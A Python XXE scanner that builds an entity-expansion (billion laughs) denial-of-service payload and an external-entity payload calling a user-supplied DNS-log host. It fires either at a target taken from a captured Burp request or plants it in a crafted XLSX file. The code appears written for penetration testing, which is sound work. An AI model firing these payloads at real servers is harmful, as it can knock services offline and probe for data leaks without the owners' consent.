import argparse
import re
import requests
import time
import openpyxl
import zipfile 
import os
import shutil
import uuid
import sys


DosPayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY dos "dos">
  <!ENTITY dos2 "&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;">
  <!ENTITY dos3 "&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;">
  <!ENTITY dos4 "&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;">
  <!ENTITY dos5 "&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;">
  <!ENTITY dos6 "&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;">
  <!ENTITY dos7 "{dos6}">
]>
<root>&dos7;</root>'''

DnsPayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{host}">
]>
<root>&xxe;</root>'''


def insert_payload_to_xlsx(payload,file_name = None):
    wb = openpyxl.Workbook()
    original_file_path = f'{uuid.uuid4()}.xlsx'
    wb.save(original_file_path)
    
    with zipfile.ZipFile(original_file_path, 'r') as zip_ref:
        zip_ref.extractall('temp_folder')

    content_types_path = os.path.join('temp_folder', '[Content_Types].xml')
    
    with open(content_types_path, 'r', encoding='utf-8') as file:
        content_types_xml = file.read()

    lines = content_types_xml.splitlines()
    lines.insert(0, payload.strip()) 
    modified_content_types_xml = '\n'.join(lines)

    with open(content_types_path, 'w', encoding='utf-8') as file:
        file.write(modified_content_types_xml)

    if file_name:
        new_file_path = file_name;
    else:
        new_file_path = f'modified_{uuid.uuid4()}.xlsx'
    
    with zipfile.ZipFile(new_file_path, 'w') as zip_ref:
        for foldername, subfolders, filenames in os.walk('temp_folder'):
            for filename in filenames:
                temp_file_path = os.path.join(foldername, filename)
                zip_ref.write(temp_file_path, os.path.relpath(temp_file_path, 'temp_folder'))

    shutil.rmtree('temp_folder')

    if os.path.exists(original_file_path):
        os.remove(original_file_path)

    return new_file_path  

def get_dns(dns):
    regex = r'(?:https?://)?([^:/]+(:\d+)?)'
    match = re.search(regex, dns)
    if match:
        host = match.group(1)
        dns_payload = DnsPayload.format(host=host)
        return dns_payload
    else:
        print("\033[31m[-] Unable to resolve DNS, please check your input.\033[0m")
        sys.exit(1)

def dos_check(args):
    if not args.nodos:
        times = []
        payloads = [
            DosPayload.format(dos6='&dos6;' * 10),
            DosPayload.format(dos6='&dos6;' * 13),
            DosPayload.format(dos6='&dos6;' * 16)
        ]
        
        for payload in payloads:
            start_time = time.time()
            if args.type == "xlsx":
                file_path = insert_payload_to_xlsx(payload)
                send_http_request(args, file_path)
                
            else:
                send_http_request(args, payload)
            end_time = time.time()
            times.append(end_time - start_time)
        
        if times[1] > times[0] and times[2] > times[1] or times[2] > times[0]:
            print("\033[32m[*] The DOS test may have an XXE vulnerability\033[0m")
        else:
            print("\033[31m[-] The DOS test does not have an XXE vulnerability\033[0m")

def dns_check(args):
    if args.dns:
        dns_payload = get_dns(args.dns)
        if args.type == "xlsx":
            file_path = insert_payload_to_xlsx(dns_payload)
            send_http_request(args, file_path)
        else:
            send_http_request(args, dns_payload)
        print("\033[32m[*] DNS request sent, please check your dnslog\033[0m")

def check_xxe(args):
    if args.file:
        dos_check(args)
        dns_check(args)
        
    elif args.type == "xlsx":
        dos_file_name = insert_payload_to_xlsx(DosPayload.format(dos6='&dos6;' * 16), f'dos_{uuid.uuid4()}.xlsx')
        print(f"\033[34m[➹] Generated test file: {dos_file_name}.\033[0m")
        if args.dns:
            dns_payload = get_dns(args.dns)
            dns_file_name = insert_payload_to_xlsx(dns_payload,f'dns_{uuid.uuid4()}.xlsx')
            print(f"\033[34m[➹] Generated test file: {dns_file_name}.\033[0m")
        print("\033[34m[➹] Please test it yourself.\033[0m")
    else:
        print("\033[34m[➹] DosPOC:\033[0m")
        print(DosPayload.format(dos6='&dos6;' * 10))
        print("")
        print("\033[34m[➹] DnsPOC:\033[0m")
        print(DnsPayload.format(host='dnslog.com'))


 
def parse_request_data(request_data):
    lines = request_data.splitlines()
    method, url = lines[0].split(maxsplit=2)[:2]
    
    headers = {}
    is_body = False
    original_body = []
    
    for line in lines[1:]:
        if not is_body and not line.strip(): 
            is_body = True
            continue
        if is_body:
            original_body.append(line)
        else:
            key, value = line.split(': ', 1)
            headers[key] = value
    
    return method, url, headers, original_body

def parse_body(headers, original_body, body_or_xlsx, args):
    data = {}
    files = {}

    if 'Content-Type' in headers and 'multipart/form-data' in headers['Content-Type']:
        boundary = headers['Content-Type'].split('boundary=')[1].strip()
        parts = "\n".join(original_body).split(f"--{boundary}")
        for part in parts:
            part = part.strip()
            if part and 'Content-Disposition' in part:
                disposition = part.splitlines()[0]
                if 'filename=' in disposition:
                    files['file'] = open(body_or_xlsx, 'rb')  
                    os.remove(body_or_xlsx)
                else:
                    name = disposition.split('name="')[1].split('"')[0]
                    value = part.splitlines()[-1].strip()  
                    data[name] = value
        del headers['Content-Type']
    elif args.type == "xlsx":
        with open(body_or_xlsx, 'rb') as f:
            data = f.read()
        os.remove(body_or_xlsx)
    else:
        data = body_or_xlsx

    return data, files

def build_url(url, host):
    if url.startswith("/"):
        return f"http://{host}{url}"
    elif not url.startswith(("http://", "https://")):
        return f"http://{host}/{url}"
    return url

def send_http_request(args, body_or_xlsx):
    with open(args.file, 'r') as file:
        request_data = file.read()

    method, url, headers, original_body = parse_request_data(request_data)
    data, files = parse_body(headers, original_body, body_or_xlsx, args)

    if 'Host' in headers:
        url = build_url(url, headers['Host'])

    try:
        requests.request(method, url, headers=headers, files=files, data=data, verify=False)
    except requests.exceptions.SSLError:
        http_url = url.replace("https://", "http://", 1)
        requests.request(method, http_url, headers=headers, files=files, data=data, verify=False)
    except Exception as e:
        print("\033[31mRequest failed\033[0m")
        print(e)


def main(args):
    if args.type == "request" or args.type == "xlsx":
        check_xxe(args)
    
 
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XXE vulnerability detection tool")
    parser.add_argument("-t", "--type", required=True, choices=['request', 'xlsx'], 
                    help="Specify the type of operation: 'request' for a normal request, 'xlsx' for uploading an XLSX file.")
    parser.add_argument("-d", "--dns",  help="DNS request link.")
    parser.add_argument("-f", "--file",  help="Request the data file path, such as the Burp intercept request packet.")
    parser.add_argument("--nodos", action='store_true', help="Prohibit the use of DOS detection.")
    args = parser.parse_args()
    main(args)

